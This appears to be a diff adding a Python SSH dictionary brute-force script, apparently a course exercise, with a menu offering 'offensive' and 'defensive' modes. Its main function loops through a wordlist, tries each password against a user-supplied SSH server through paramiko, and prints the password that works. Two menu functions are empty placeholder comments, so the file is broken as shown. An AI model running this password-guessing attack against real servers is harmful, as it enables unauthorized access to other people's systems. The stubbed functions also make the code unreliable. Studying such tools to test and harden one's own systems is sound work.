@@ -1,0 +1,59 @@
+#!/usr/bin/env python3
+# Script Name: Wordlist Attack using SSH connection
+# Author: Festus Oguhebe Jr. 
+
+import paramiko
+import time
+
+def iterator():
+    # ... [existing iterator function code] ...
+
+def check_password():
+    # ... [existing check_password function code] ...
+
+def ssh_brute_force():
+    ssh_ip = input("Enter the SSH server IP address:\n")
+    ssh_user = input("Enter the SSH username:\n")
+    filepath = input("Enter your dictionary filepath:\n")
+
+    try:
+        with open(filepath, encoding="ISO-8859-1") as file:
+            for word in file:
+                password = word.strip()
+                try:
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    ssh.connect(ssh_ip, username=ssh_user, password=password)
+                    print(f"Success! Password is: {password}")
+                    ssh.close()
+                    break
+                except paramiko.AuthenticationException:
+                    print(f"Failed password: {password}")
+                    ssh.close()
+                except Exception as e:
+                    print(f"Error connecting to SSH: {e}")
+                    break
+    except FileNotFoundError:
+        print("File not found. Please check the file path.")
+
+# Main
+if __name__ == "__main__":
+    while True:
+        mode = input("""
+Brute Force Wordlist Attack Tool Menu
+1 - Offensive, Dictionary Iterator
+2 - Defensive, Password Recognized
+3 - SSH Brute Force
+4 - Exit
+    Please enter a number: 
+""")
+        if mode == "1":
+            iterator()
+        elif mode == "2":
+            check_password()
+        elif mode == "3":
+            ssh_brute_force()
+        elif mode == "4":
+            break
+        else:
+            print("Invalid selection...") 
